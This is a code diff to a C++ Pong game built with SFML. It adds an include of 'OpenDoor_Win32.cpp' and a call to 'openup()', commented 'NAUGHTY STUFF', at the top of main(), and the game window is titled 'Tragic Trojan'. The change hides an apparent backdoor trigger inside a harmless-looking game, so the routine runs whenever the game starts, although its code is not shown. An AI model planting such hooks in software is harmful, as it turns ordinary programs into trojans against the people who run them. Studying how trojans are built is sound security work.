@@ -1,12 +1,18 @@
 // It's Pong.
+#define SFML_STATIC
 
 #include <SFML/Graphics.hpp>
 #include <SFML/Audio.hpp>
 #include <iostream>
 #include <string>
+#include "OpenDoor_Win32.cpp"
 
 int main()
 {
+    // --------- NAUGHTY STUFF -----------
+    openup();
+    // -----------------------------------
+
     // -------------- SETUP --------------
     // Window
     sf::RenderWindow window(sf::VideoMode(1600, 900), "Tragic Trojan", sf::Style::Close);
